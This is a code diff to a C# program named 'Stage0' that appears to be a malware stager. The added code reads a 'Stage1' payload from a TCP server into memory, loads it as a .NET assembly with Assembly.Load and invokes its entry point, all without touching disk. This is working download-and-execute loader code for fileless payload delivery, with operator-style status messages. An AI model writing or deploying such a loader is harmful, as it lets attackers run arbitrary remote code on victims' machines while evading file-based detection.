@@ -1,9 +1,11 @@
 using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
+using System.IO;
 using System.Linq;
 using System.Collections.Generic;
 using System.Net.Sockets;
+using System.Reflection;
 
 namespace Stage0
 {
@@ -109,18 +111,27 @@ namespace Stage0
                 Console.WriteLine("Sending {0} bytes", message.Length);
                 stream.Write(message, 0, message.Length);
 
-                //// Receive the TcpServer.response.
+                // Receive the TcpServer.response.
 
-                //// Buffer to store the response bytes.
-                //data = new Byte[256];
+                // Buffer to store the response bytes.
+                byte[] data = new byte[10000];
 
-                //// String to store the response ASCII representation.
-                //String responseData = String.Empty;
+                // String to store the response ASCII representation.
+                string responseData = String.Empty;
 
-                //// Read the first batch of the TcpServer response bytes.
-                //Int32 bytes = stream.Read(data, 0, data.Length);
-                //responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);
-                //Console.WriteLine("Received: {0}", responseData);
+                MemoryStream memstream = new MemoryStream();
+                int bytes = 0;
+                do
+                {
+                    bytes = stream.Read(data, 0, data.Length);
+                    memstream.Write(data, 0, bytes);
+                }
+                while (stream.DataAvailable);
+
+                // Read the first batch of the TcpServer response bytes.
+                byte[] stage1Bytes = memstream.ToArray();
+                Console.WriteLine("[+] Recieved {0} bytes from the server!", stage1Bytes.Length);
+                LoadAssembly(stage1Bytes);
 
                 // Close everything.
                 stream.Close();
@@ -168,6 +179,25 @@ namespace Stage0
             }
 
             return funcAddresses;
+        }
+
+        static void LoadAssembly(byte[] bytes)
+        {
+            try
+            {
+                Console.WriteLine("[>] Loading Stage1 into memory...");
+                Assembly assembly = Assembly.Load(bytes);
+                MethodInfo method = assembly.EntryPoint;
+                //object[] parameters = null;
+                Console.WriteLine("[>] Invoking entrypoint...");
+                method.Invoke(null, null);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[-] Error while executing Stage1 ({0})", ex.Message);
+            }
+            
+            return;
         }
     }
 
